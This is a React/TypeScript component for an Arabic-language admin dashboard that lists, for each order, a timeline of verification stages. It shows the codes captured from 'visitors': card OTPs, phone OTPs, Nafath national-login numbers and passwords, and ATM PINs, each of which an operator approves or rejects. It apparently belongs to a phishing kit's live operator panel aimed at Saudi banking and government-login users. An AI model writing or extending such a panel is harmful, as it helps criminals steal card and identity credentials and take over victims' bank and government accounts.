import { Clock, Check, X, Phone, CreditCard, Fingerprint, KeyRound, Landmark, Shield } from "lucide-react";

interface StageEvent {
  id: string;
  order_id: string;
  stage: string;
  status: string;
  stage_entered_at: string;
  resolved_at: string | null;
  payload: Record<string, any> | null;
}

interface AdminStageTimelineProps {
  stageEvents: StageEvent[];
  orderId: string;
}

const STAGE_META: Record<string, { label: string; icon: React.ReactNode; color: string }> = {
  phone_otp: { label: "كود توثيق الجوال", icon: <Phone className="w-3 h-3" />, color: "text-violet-500 bg-violet-500/15 border-violet-500/30" },
  phone_verification: { label: "كود توثيق الجوال", icon: <Phone className="w-3 h-3" />, color: "text-violet-500 bg-violet-500/15 border-violet-500/30" },
  otp: { label: "كود OTP البطاقة", icon: <CreditCard className="w-3 h-3" />, color: "text-blue-500 bg-blue-500/15 border-blue-500/30" },
  nafath_login: { label: "دخول النفاذ", icon: <Fingerprint className="w-3 h-3" />, color: "text-cyan-500 bg-cyan-500/15 border-cyan-500/30" },
  nafath_verify: { label: "رمز النفاذ", icon: <KeyRound className="w-3 h-3" />, color: "text-cyan-600 bg-cyan-600/15 border-cyan-600/30" },
  atm: { label: "ATM", icon: <Landmark className="w-3 h-3" />, color: "text-emerald-500 bg-emerald-500/15 border-emerald-500/30" },
  stc_call: { label: "مكالمة STC", icon: <Phone className="w-3 h-3" />, color: "text-purple-500 bg-purple-500/15 border-purple-500/30" },
};

const STATUS_ICONS: Record<string, { icon: React.ReactNode; color: string; label: string }> = {
  pending: { icon: <Clock className="w-3 h-3" />, color: "text-amber-500", label: "بانتظار" },
  approved: { icon: <Check className="w-3 h-3" />, color: "text-emerald-500", label: "موافق" },
  rejected: { icon: <X className="w-3 h-3" />, color: "text-red-500", label: "مرفوض" },
};

const formatDateTime = (dateStr: string) => {
  const d = new Date(dateStr);
  return d.toLocaleString("ar-SA", {
    month: "short", day: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    hour12: false,
  });
};

const extractCode = (event: StageEvent): string | null => {
  const p = event.payload;
  if (!p) return null;
  return p.code || p.otp_code || p.phone_otp_code || p.nafath_number || p.nafath_password || p.atm_pin || null;
};

const extractEventNote = (event: StageEvent): string | null => {
  const payload = event.payload;
  if (!payload) return null;

  if (payload.resend_requested) {
    return "الزائر طلب إرسال رمز جديد";
  }

  return null;
};

const AdminStageTimeline = ({ stageEvents, orderId }: AdminStageTimelineProps) => {
  const events = stageEvents
    .filter(e => e.order_id === orderId)
    .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());

  if (events.length === 0) return null;

  return (
    <div className="space-y-0">
      {events.map((event, index) => {
        const meta = STAGE_META[event.stage] || { label: event.stage, icon: <Shield className="w-3 h-3" />, color: "text-muted-foreground bg-muted/15 border-border/30" };
        const statusInfo = STATUS_ICONS[event.status] || STATUS_ICONS.pending;
        const code = extractCode(event);
        const note = extractEventNote(event);
        const isLast = index === events.length - 1;

        return (
          <div key={event.id} className="flex gap-2 relative">
            {/* Timeline line */}
            {!isLast && (
              <div className="absolute right-[11px] top-[22px] bottom-0 w-px bg-border/50" />
            )}
            
            {/* Dot */}
            <div className={`w-[22px] h-[22px] rounded-full border-2 flex items-center justify-center shrink-0 mt-0.5 z-10 ${
              event.status === "approved" ? "border-emerald-500 bg-emerald-500/15" :
              event.status === "rejected" ? "border-red-500 bg-red-500/15" :
              "border-amber-500 bg-amber-500/15"
            }`}>
              <span className={statusInfo.color}>{statusInfo.icon}</span>
            </div>

            {/* Content */}
            <div className={`flex-1 pb-3 ${isLast ? "" : ""}`}>
              <div className="flex items-center gap-1.5 flex-wrap">
                <span className={`inline-flex items-center gap-1 px-1.5 py-0.5 rounded-md text-[10px] font-bold border ${meta.color}`}>
                  {meta.icon} {meta.label}
                </span>
                <span className={`text-[9px] font-medium ${statusInfo.color}`}>{statusInfo.label}</span>
              </div>
              
              {code && (
                <div className="mt-1 bg-muted/30 rounded-md px-2 py-1 inline-block">
                  <span className="text-[10px] text-muted-foreground ml-1">الكود:</span>
                  <span className="text-xs font-mono font-bold text-foreground tracking-wider">{code}</span>
                </div>
              )}

              {note && (
                <div className="mt-1 inline-flex items-center rounded-md border border-amber-500/20 bg-amber-500/10 px-2 py-1 text-[10px] font-medium text-amber-700">
                  {note}
                </div>
              )}

              <div className="flex items-center gap-2 mt-0.5">
                <span className="text-[9px] text-muted-foreground/70">{formatDateTime(event.stage_entered_at)}</span>
                {event.resolved_at && (
                  <span className="text-[9px] text-muted-foreground/50">← {formatDateTime(event.resolved_at)}</span>
                )}
              </div>
            </div>
          </div>
        );
      })}
    </div>
  );
};

export default AdminStageTimeline;
